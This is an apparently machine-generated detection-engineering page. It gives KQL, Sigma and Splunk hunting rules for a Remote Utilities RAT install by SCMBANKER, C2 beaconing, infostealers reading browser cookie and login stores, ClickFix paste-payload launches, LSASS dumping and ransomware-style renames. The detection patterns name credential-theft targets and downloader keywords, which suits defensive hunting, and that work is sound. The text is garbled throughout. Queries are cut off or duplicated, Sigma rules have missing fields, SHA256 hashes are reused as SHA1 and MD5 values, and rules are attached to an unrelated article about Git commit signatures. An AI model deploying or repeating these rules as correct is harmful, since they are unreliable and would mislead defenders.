SCMBANKER Remote Utilities RAT host deployment (avs.ps1) AICommand & Control Medium
Hunts the SCMBANKER full-takeover stage where avs.ps1 silently installs the commercial Remote Utilities host for hands-on operator access. Article-specific because it ties the Remote Utilities host binaries (rutserv.exe/rfusclient.exe) to a PowerShell (avs.ps1) install path rather than legitimate IT deployment. Rationale: Elastic/GBHackers confirm avs.ps1 silently deploys a commercial Remote Utilities host for full takeover; tying rutserv.exe/rfusclient.exe (or the Remote Utilities file metadata) to an avs.ps1 PowerShell parent distinguishes malicious deployment from sanctioned IT use. Cross-checked against: • https://www.elastic.co/security-labs/mexican-banking-fraud-scmbanker-ref6045 • https://gbhackers.com/ref6045-uses-scmbanker-powershell/
ATT&CKT1219
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Organizations that legitimately license Remote Utilities for helpdesk (whitelist their signed deployment path/installer)
  • MSP remote-support sessions using Remote Utilities
  • Vendor support tooling bundling rfusclient.exe
  • Security team red-team RAT test
Suppression filter
| where not (InitiatingProcessFileName in~ ("msiexec.exe") and InitiatingProcessCommandLine has "RemoteUtilities" and InitiatingProcessFolderPath has @"\Program Files")
Response runbook
1) Triage: determine whether Remote Utilities is a sanctioned tool in the org; if not, treat any execution as malicious. Check whether the install parent was avs.ps1 / run.vbs / powershell rather than an approved installer. 2) Contain: isolate the host, kill rutserv.exe/rfusclient.exe, block the Remote Utilities relay/C2 IPs, and reset credentials used on the box. 3) Hunt: correlate to the SCMBANKER module chain (cliente.ps1 beacon, jujuzkt.ps1 banking monitor) and search the fleet for the same avs.ps1 install and Remote Utilities host installs.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("rutserv.exe","rfusclient.exe")
    or ProcessVersionInfoCompanyName has "Remote Utilities"
    or ProcessVersionInfoProductName has "Remote Utilities"
    or (InitiatingProcessFileName in~ ("powershell.exe","pwsh.exe") and InitiatingProcessCommandLine has "avs.ps1")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessVersionInfoCompanyName, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\rutserv.exe" or NewProcessName endswith "\\rfusclient.exe"
    or (ParentProcessName has_any ("powershell.exe","pwsh.exe") and CommandLine has "avs.ps1")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc
title: SCMBANKER Remote Utilities RAT Deployment
id: 8f3a1c22-4b6e-4d3a-9f21-1a2b3c4d5e07
description: Remote Utilities host binaries (rutserv.exe/rfusclient.exe) executing, used by SCMBANKER via avs.ps1 for operator hands-on-keyboard access.
references:
  - https://www.elastic.co/security-labs/mexican-banking-fraud-scmbanker-ref6045
author: SOC Detection Engineering
date: 2026/07/08
tags:
  - attack.t1219
logsource:
  category: process_creation
  product: windows
detection:
  selection_bin:
    Image|endswith:
      - '\rutserv.exe'
      - '\rfusclient.exe'
  selection_script:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
    CommandLine|contains: 'avs.ps1'
  condition: selection_bin or selection_script
level: medium
source:windows.sysmon @EventID:1 (@Image:(*\rutserv.exe OR *\RUTSERV.EXE OR *\rfusclient.exe OR *\RFUSCLIENT.EXE) OR (@ParentImage:(*\powershell.exe OR *\PowerShell.exe OR *\pwsh.exe) AND @CommandLine:*avs.ps1*))
#event_simpleName=ProcessRollup2 ImageFileName=/(rutserv|rfusclient)\.exe$/i OR (ParentBaseFileName=/(powershell|pwsh)\.exe$/i CommandLine=/avs\.ps1/i)
| groupBy([aid, ComputerName, ImageFileName, ParentBaseFileName, CommandLine], function=count())
ENDPOINT

| `drop_dm_object_name(Processes)`
| convert ctime(firstTime) ctime(lastTime)
| sort - lastTime
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name IN (rutserv.exe,rfusclient.exe) OR Processes.process="*avs.ps1*") by Processes.dest Processes.user Processes.parent_process_name Processes.process Processes.process_name
| `drop_dm_object_name(Processes)`
| convert ctime(firstTime) ctime(lastTime)
| sort - lastTime
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Suspicious browser extension installation Installation Medium
Side-loaded / unsigned extensions, often masquerading as wallets, productivity tools.
ATT&CKT1176
Data sourcesEndpoint.Registry DeviceRegistryEvents
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where RegistryKey has_any ("\Software\Google\Chrome\Extensions\","\Software\Microsoft\Edge\Extensions\","\Software\Mozilla\Firefox\Extensions\")
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData,
          InitiatingProcessFileName, InitiatingProcessAccountName

| where ActorUsername !endswith "$"

                              @"\Software\Microsoft\Edge\Extensions\",
                              @"\Software\Mozilla\Firefox\Extensions\")
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey,
          RegistryValue, RegistryValueData, ActingProcessName
| order by TimeGenerated desc

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count

| join type=inner src

         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",

        clicked_domain, clicked_url, exec_proc, exec_cmd

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

status: experimental
description: |
    "FakeCaptcha" / "ClickFix" social-engineering: malicious site asks
    user to press Win+R and paste a payload. The result is
    powershell/mshta launched directly from explorer.exe with iex /
    base64 / downloadstring in the command line.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1204/002/
author: Clankerusecase
date: 2026/05/02
tags:

    - attack.t1204.002

    category: process_creation
    product: windows

    selection_parent:

            - '\explorer.exe'
            - '\RuntimeBroker.exe'
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\mshta.exe'
    selection_cmd:
        CommandLine|contains:
            - 'iex'
            - 'invoke-expression'
            - 'frombase64'
            - 'downloadstring'
            - 'hxxp'
            - 'curl '
            - 'wget '
    condition: selection_parent and selection_child and selection_cmd
falsepositives:

level: high

Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime

    where Processes.parent_process_name IN ("explorer.exe","RuntimeBroker.exe")
      AND Processes.process_name IN ("powershell.exe","pwsh.exe","mshta.exe")
      AND (Processes.process="*iex*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*FromBase64*" OR Processes.process="*DownloadString*"
        OR Processes.process="*hxxp*" OR Processes.process="*curl*" OR Processes.process="*wget*")

      AND (Processes.process="*iex*" OR Processes.process="*Invoke-Expression*"

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("b30cb0aa977aacdab94d2ef503186c8f0b2fc10d7cf0d7c7c0ada70c127dc7e8", "554f1aefeb698995501751328c2f9fe93f02a680679fba3dd15f1ed93d46bf1b", "ff3555154e91e42490cc722b6c7f3c4c91654b7ef53a35d0719ffb89accf1b27") or SHA1 in~ ("b30cb0aa977aacdab94d2ef503186c8f0b2fc10d7cf0d7c7c0ada70c127dc7e8", "554f1aefeb698995501751328c2f9fe93f02a680679fba3dd15f1ed93d46bf1b", "ff3555154e91e42490cc722b6c7f3c4c91654b7ef53a35d0719ffb89accf1b27") or MD5 in~ ("b30cb0aa977aacdab94d2ef503186c8f0b2fc10d7cf0d7c7c0ada70c127dc7e8", "554f1aefeb698995501751328c2f9fe93f02a680679fba3dd15f1ed93d46bf1b", "ff3555154e91e42490cc722b6c7f3c4c91654b7ef53a35d0719ffb89accf1b27")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("b30cb0aa977aacdab94d2ef503186c8f0b2fc10d7cf0d7c7c0ada70c127dc7e8", "554f1aefeb698995501751328c2f9fe93f02a680679fba3dd15f1ed93d46bf1b", "ff3555154e91e42490cc722b6c7f3c4c91654b7ef53a35d0719ffb89accf1b27") or SHA1 in~ ("b30cb0aa977aacdab94d2ef503186c8f0b2fc10d7cf0d7c7c0ada70c127dc7e8", "554f1aefeb698995501751328c2f9fe93f02a680679fba3dd15f1ed93d46bf1b", "ff3555154e91e42490cc722b6c7f3c4c91654b7ef53a35d0719ffb89accf1b27") or MD5 in~ ("b30cb0aa977aacdab94d2ef503186c8f0b2fc10d7cf0d7c7c0ada70c127dc7e8", "554f1aefeb698995501751328c2f9fe93f02a680679fba3dd15f1ed93d46bf1b", "ff3555154e91e42490cc722b6c7f3c4c91654b7ef53a35d0719ffb89accf1b27")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["b30cb0aa977aacdab94d2ef503186c8f0b2fc10d7cf0d7c7c0ada70c127dc7e8", "554f1aefeb698995501751328c2f9fe93f02a680679fba3dd15f1ed93d46bf1b", "ff3555154e91e42490cc722b6c7f3c4c91654b7ef53a35d0719ffb89accf1b27"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

GitHub 'Verified' Commits Can Be Rewritten Into New Hashes Without Breaking Signatures

The Hacker News
2026-07-08 6 use cases 4 techniques 5 kill-chain phases detected

New research shows that a signed Git commit's hash is not the one-of-a-kind name that much of the software world assumes it to be. Given any signed commit, someone without the signing key can mint a second commit with the same files, author, and date, and a valid signature, GitHub still stamps "Verified." Everything a reviewer would check matches. The commit's hash does not. That matters

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement

    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")

    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

The Verification Step Is the New ATO Battleground in 2026

The Hacker News
2026-07-08 8 use cases 4 techniques 5 kill-chain phases detected

